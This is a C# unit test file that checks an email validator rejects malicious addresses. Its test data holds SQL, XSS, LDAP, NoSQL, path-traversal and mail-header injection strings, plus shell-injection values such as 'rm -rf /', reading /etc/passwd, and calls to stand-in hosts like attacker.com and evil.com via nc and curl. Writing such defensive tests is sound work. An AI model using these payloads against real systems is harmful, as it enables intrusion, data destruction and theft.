using NextResta.Infrastructure.Services;

namespace NextResta.UnitTests.Infrastructure.EmailValidator;

/// <summary>
/// Security-focused tests for EmailValidator - Production Security Testing
/// Tests malicious inputs, injection attempts, and security edge cases
/// </summary>
public class EmailValidatorSecurityTests
{
    #region SQL Injection Attempts

    [Theory]
    [InlineData("user'; DROP TABLE users; --@domain.com")]
    [InlineData("admin' OR '1'='1@company.org")]
    [InlineData("test'; DELETE FROM emails; --@service.net")]
    [InlineData("user' UNION SELECT * FROM passwords--@domain.co")]
    [InlineData("admin'; INSERT INTO logs VALUES('hack')--@business.io")]
    public void IsValidEmail_SQLInjectionAttempts_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    #endregion

    #region XSS Injection Attempts

    [Theory]
    [InlineData("<script>alert('xss')</script>@domain.com")]
    [InlineData("user<img src=x onerror=alert(1)>@company.org")]
    [InlineData("admin<svg onload=alert(1)>@service.net")]
    [InlineData("test<iframe src=javascript:alert(1)>@domain.co")]
    [InlineData("user<body onload=alert(1)>@business.io")]
    public void IsValidEmail_XSSInjectionAttempts_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    #endregion

    #region Command Injection Attempts

    [Theory]
    [InlineData("user; rm -rf /;@domain.com")]
    [InlineData("admin && cat /etc/passwd@company.org")]
    [InlineData("test | nc attacker.com 1234@service.net")]
    [InlineData("user`whoami`@domain.co")]
    [InlineData("admin$(curl evil.com)@business.io")]
    public void IsValidEmail_CommandInjectionAttempts_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    #endregion

    #region Path Traversal Attempts

    [Theory]
    [InlineData("../../../etc/passwd@domain.com")]
    [InlineData("..\\..\\windows\\system32\\config\\sam@company.org")]
    [InlineData("user/../admin@service.net")]
    [InlineData("test/../../root@domain.co")]
    [InlineData("admin\\..\\..\\sensitive@business.io")]
    public void IsValidEmail_PathTraversalAttempts_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    #endregion

    #region Buffer Overflow Attempts

    [Fact]
    public void IsValidEmail_ExtremelyLongInput_ShouldReturnFalse()
    {
        // Arrange - Create extremely long email (10,000 characters)
        var extremelyLongEmail = new string('a', 9990) + "@domain.com";

        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(extremelyLongEmail);

        // Assert
        Assert.False(result);
    }

    [Fact]
    public void IsValidEmail_RepeatedCharacters_ShouldHandleGracefully()
    {
        // Arrange
        var repeatedEmail = new string('x', 1000) + "@" + new string('y', 1000) + ".com";

        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(repeatedEmail);

        // Assert
        Assert.False(result); // Should be false due to length
    }

    #endregion

    #region Unicode and Encoding Attacks

    [Theory]
    [InlineData("user\u0000@domain.com")]        // Null byte
    [InlineData("admin\u0001@company.org")]       // Control character
    [InlineData("test\u007F@service.net")]        // DEL character
    [InlineData("user\u200B@domain.co")]          // Zero-width space
    [InlineData("admin\uFEFF@business.io")]       // Byte order mark
    public void IsValidEmail_UnicodeControlCharacters_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    [Theory]
    [InlineData("user%00@domain.com")]
    [InlineData("admin%0A@company.org")]
    [InlineData("test%0D@service.net")]
    [InlineData("user%09@domain.co")]
    [InlineData("admin%20@business.io")]
    public void IsValidEmail_URLEncodedCharacters_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    #endregion

    #region Protocol Injection Attempts

    [Theory]
    [InlineData("javascript:alert(1)@domain.com")]
    [InlineData("data:text/html,<script>alert(1)</script>@company.org")]
    [InlineData("file:///etc/passwd@service.net")]
    [InlineData("ftp://attacker.com@domain.co")]
    [InlineData("ldap://evil.com@business.io")]
    public void IsValidEmail_ProtocolInjectionAttempts_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    #endregion

    #region LDAP Injection Attempts

    [Theory]
    [InlineData("user*)(uid=*))(|(uid=*@domain.com")]
    [InlineData("admin*)(|(password=*)@company.org")]
    [InlineData("test*))%00@service.net")]
    [InlineData("user*)(objectClass=*)@domain.co")]
    [InlineData("admin*)(cn=*))(|(cn=*@business.io")]
    public void IsValidEmail_LDAPInjectionAttempts_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    #endregion

    #region NoSQL Injection Attempts

    [Theory]
    [InlineData("user'; return true; var dummy='@domain.com")]
    [InlineData("admin' || '1'=='1@company.org")]
    [InlineData("test'; return this.password; var dummy='@service.net")]
    [InlineData("user' && this.password.match(/.*/)//+%00@domain.co")]
    [InlineData("admin'; return db.users.find(); var dummy='@business.io")]
    public void IsValidEmail_NoSQLInjectionAttempts_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    #endregion

    #region Header Injection Attempts

    [Theory]
    [InlineData("user@domain.com\r\nBcc: attacker@evil.com")]
    [InlineData("admin@company.org\nTo: victim@target.com")]
    [InlineData("test@service.net\r\nSubject: Spam")]
    [InlineData("user@domain.co\nX-Mailer: Malicious")]
    [InlineData("admin@business.io\r\n\r\nMalicious body")]
    public void IsValidEmail_HeaderInjectionAttempts_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    #endregion

    #region Stress Tests

    [Fact]
    public void IsValidEmail_ConcurrentValidation_ShouldBeThreadSafe()
    {
        // Arrange
        var emails = new[]
        {
            "user1@example.com",
            "user2@domain.org",
            "user3@service.net",
            "invalid@domain.con",
            "disposable@10minutemail.com"
        };

        // Act & Assert
        Parallel.ForEach(emails, email =>
        {
            for (int i = 0; i < 100; i++)
            {
                var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(email);
                Assert.NotNull(result);
            }
        });
    }

    [Fact]
    public void ValidateEmail_HighVolumeValidation_ShouldMaintainPerformance()
    {
        // Arrange
        var validEmail = "user@example.com";
        var invalidEmail = "user@domain.con";

        // Act & Assert
        var startTime = DateTime.UtcNow;
        
        for (int i = 0; i < 10000; i++)
        {
            var validResult = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(validEmail);
            var invalidResult = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(invalidEmail);
            
            Assert.True(validResult);
            Assert.False(invalidResult);
        }
        
        var endTime = DateTime.UtcNow;
        var duration = endTime - startTime;
        
        // Should complete 20,000 validations in under 5 seconds
        Assert.True(duration.TotalSeconds < 5, $"Validation took {duration.TotalSeconds} seconds, expected < 5");
    }

    #endregion

    #region Detailed Security Validation

    [Fact]
    public void ValidateEmail_MaliciousInput_ShouldReturnSecureErrorMessage()
    {
        // Arrange
        var maliciousEmail = "<script>alert('xss')</script>@domain.com";

        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.ValidateEmail(maliciousEmail);

        // Assert
        Assert.False(result.IsValid);
        Assert.Equal(EmailValidationErrorType.InvalidFormat, result.ErrorType);
        Assert.DoesNotContain("<script>", result.ErrorMessage ?? "");
        Assert.DoesNotContain("alert", result.ErrorMessage ?? "");
    }

    [Fact]
    public void ValidateEmail_SQLInjection_ShouldReturnSecureErrorMessage()
    {
        // Arrange
        var sqlInjection = "user'; DROP TABLE users; --@domain.com";

        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.ValidateEmail(sqlInjection);

        // Assert
        Assert.False(result.IsValid);
        Assert.Equal(EmailValidationErrorType.InvalidFormat, result.ErrorType);
        Assert.DoesNotContain("DROP", result.ErrorMessage ?? "");
        Assert.DoesNotContain("TABLE", result.ErrorMessage ?? "");
    }

    #endregion

    #region Input Sanitization Tests

    [Theory]
    [InlineData("user@domain.com\0")]           // Null terminator
    [InlineData("user@domain.com\x1F")]         // Unit separator
    [InlineData("user@domain.com\x7F")]         // Delete character
    [InlineData("user@domain.com\xFF")]         // High byte
    public void IsValidEmail_BinaryCharacters_ShouldReturnFalse(string maliciousEmail)
    {
        // Act
        var result = NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(maliciousEmail);

        // Assert
        Assert.False(result);
    }

    [Fact]
    public void IsValidEmail_EmptyStringVariations_ShouldHandleGracefully()
    {
        // Arrange & Act & Assert
        Assert.False(NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(""));
        Assert.False(NextResta.Infrastructure.Services.EmailValidator.IsValidEmail(" "));
        Assert.False(NextResta.Infrastructure.Services.EmailValidator.IsValidEmail("\t"));
        Assert.False(NextResta.Infrastructure.Services.EmailValidator.IsValidEmail("\n"));
        Assert.False(NextResta.Infrastructure.Services.EmailValidator.IsValidEmail("\r"));
        Assert.False(NextResta.Infrastructure.Services.EmailValidator.IsValidEmail("\r\n"));
    }

    #endregion
}
